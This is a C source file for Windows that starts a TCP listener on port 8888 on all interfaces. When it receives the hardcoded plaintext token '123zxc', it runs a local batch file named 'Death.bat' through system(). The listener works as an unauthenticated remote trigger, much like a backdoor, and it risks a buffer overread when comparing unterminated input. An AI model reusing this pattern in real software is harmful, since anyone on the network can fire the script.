#include <Winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <WS2tcpip.h>

#define BUFFER_SIZE 1024
#define PORT 8888

void error_exit(const char *msg) {
    printf("%s\n", msg);
    exit(EXIT_FAILURE);
}

int main(void) {
    WSADATA wsaData;
    int iResult;
    char *token = {"123zxc"};
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        error_exit("WSAStartup failed");
    }

    int server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    char buffer[BUFFER_SIZE] = {0};

    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        error_exit("Socket creation failed");
    }

    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt)) == SOCKET_ERROR) {
        error_exit("Setsockopt failed");
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) == SOCKET_ERROR) {
        error_exit("Bind failed");
    }

    if (listen(server_fd, 1) == SOCKET_ERROR) {
        error_exit("Listen failed");
    }

    printf("Server is listening...\n");

    if ((new_socket = accept(server_fd, (struct sockaddr *)&address, &addrlen)) == INVALID_SOCKET) {
        error_exit("Accept failed");
    }

    int valread;
    while ((valread = recv(new_socket, buffer, BUFFER_SIZE, 0)) > 0) {
        if (strcmp(buffer, token) == 0)
        {
            system("Death.bat");
        }
        printf("Client: %s", buffer);
        memset(buffer, 0, sizeof(buffer));
    }

    closesocket(server_fd);
    printf("Server has closed!\n");

    WSACleanup();
    return 0;
}
